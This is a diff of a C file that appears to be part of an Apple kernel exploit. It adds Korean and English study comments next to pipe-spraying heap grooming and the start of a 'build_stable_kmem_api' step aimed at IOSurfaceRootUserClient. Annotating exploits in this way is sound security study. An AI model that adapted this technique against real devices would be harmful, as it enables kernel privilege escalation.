@@ -79,9 +79,12 @@ int main(int argc, char *argv[], char *envp[]) {
 	pipefds = create_pipes();
 	pipe_buffer = (uint8_t *)malloc(pipe_buffer_size);
 	//memset_pattern4 = 메모리 설정 함수로, 4바이트 패턴을 사용하여 특정 메모리 영역을 채울 때 사용, 따라서 pipe 4글자로 채워짐
-	memset_pattern4(pipe_buffer, "pipe", pipe_buffer_size);
+	memset_pattern4(pipe_buffer, "pipe", pipe_buffer_size);	//<- work even if disable this code.
 	pipe_spray(pipefds, 1, pipe_buffer, pipe_buffer_size);
-	read_pipe();	//?
+	// read - bsd/kern/sys_generic.c:201
+	// fo_read - bsd/kern/kern_descrip.c:5572
+	// pipe_read - bsd/kern/sys_pipe.c:740
+	read_pipe();	
 
 	//build_stable_kmem_api
 	uint64_t IOSurfaceRootUserClient_port = find_port(IOSurfaceRootUserClient);
